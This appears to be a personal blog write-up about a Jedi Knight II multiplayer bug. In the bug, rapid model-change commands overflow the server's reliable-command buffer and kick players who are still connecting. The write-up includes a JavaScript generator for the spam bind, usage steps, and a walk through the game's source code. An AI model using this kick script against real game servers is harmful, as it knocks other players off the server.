# Problem: "Server command overflow"

# Background

In jk2 multplayer, you can utilize scripts to perform actions much like how you can create scripts in Quake 1-3. Nowadays, game manufacturers are *probably* a little less hesitant to provide a scripting interface due to the possiblity of hacks or unfair performance gains. As a punk little teenager, I found that you can spam the server with commands which would cause any currently connecting player to get booted off the server. So in other words: kick any player that is attempting to connect. Once the player has connected, however, this hack won't work in such a way. 

# The script

It's really a crappy script. Use your favorite scripting language to generate it... but essentially what you do is switch your jk2 character's model several times within a second. Repeat the command a dozen times and you have yourself a cheap, poorly made, yet effective kick tool. 

```
bind f "model reborn/acrobat; wait 300; ... <and so on... >"
````

# Generating this piece of crap

```Javascript
/* Hah, using Javascript to generate Jedi Outcast scripts! */
var prefix = 'bind f "';
var suffix = '"';
var b = [];
var model_list = ["reborn/acrobat","reborn/fencer","reborn/boss","imperial/officer","Kyle","Tavion","Lando","Reelo" ];
for(var i=0;i < 24;i++){
  b.push("model " + model_list[Math.floor(Math.random() * model_list.length)]);
  b.push(["wait",Math.floor(Math.random() * 300)].join(" "));
}
console.log(prefix + b.join(';') + suffix);
```
# How to use

1. Take the output of the above script and dump it into a .cfg file 
2. In the jk2 console, execute your .cfg file
3. When a player is attempting to connect to the game while you are in game, hit the 'f' key a bunch of times and that player will get booted off with an error of "Server command overflow".

# Before the sources

Before the source code was available, you would have to fire up your favorite disassembler and search for the string "Server command overflow". From there on you would have to reverse engineer the assembler and look at the stack trace, code, and registers to get a good idea of what exactly happened. Now while it is tedious to generate a comprehensive look at what exactly happened in this situation (without the C++ source code), note that it is *not impossible*. Luckily, we have github and the authors of Jedi Outcast were kind enough to provide the sources. Let's take a look at where this error occurred in the source. 

# grep the source (ack)

I use a tool called "ack" to recursively find strings within a source tree. At the top level of the source code tree, I did:

```
$ ack "Server command overflow"
```

The result:

```
code/server/sv_main.cpp:83:		SV_DropClient( client, "Server command overflow" );
CODE-mp/server/sv_main.cpp:127:		SV_DropClient( client, "Server command overflow" );
```

Right away, we can tell that the string we are looking for occurs in 2 places. How nice of the developers to not use this same string all over the place in a convoluted fashion. First, I would like to see what the server is doing, so let's fire up nano (hah! trick! I use vim you fools!), and open up CODE-mp/server/sv_main.cpp and look at the function that encapsulates line 127:

```C++
/*
======================
SV_AddServerCommand

The given command will be transmitted to the client, and is guaranteed to
not have future snapshot_t executed before it is executed
======================
*/
void SV_AddServerCommand( client_t *client, const char *cmd ) {
	int		index, i;

	// this is very ugly but it's also a waste to for instance send multiple config string updates
	// for the same config string index in one snapshot
//	if ( SV_ReplacePendingServerCommands( client, cmd ) ) {
//		return;
//	}

	client->reliableSequence++;
	// if we would be losing an old command that hasn't been acknowledged,
	// we must drop the connection
	// we check == instead of >= so a broadcast print added by SV_DropClient()
	// doesn't cause a recursive drop client
	if ( client->reliableSequence - client->reliableAcknowledge == MAX_RELIABLE_COMMANDS + 1 ) {
		Com_Printf( "===== pending server commands =====\n" );
		for ( i = client->reliableAcknowledge + 1 ; i <= client->reliableSequence ; i++ ) {
			Com_Printf( "cmd %5d: %s\n", i, client->reliableCommands[ i & (MAX_RELIABLE_COMMANDS-1) ] );
		}
		Com_Printf( "cmd %5d: %s\n", i, cmd );
		SV_DropClient( client, "Server command overflow" );
		return;
	}
	index = client->reliableSequence & ( MAX_RELIABLE_COMMANDS - 1 );
	Q_strncpyz( client->reliableCommands[ index ], cmd, sizeof( client->reliableCommands[ index ] ) );
}
```
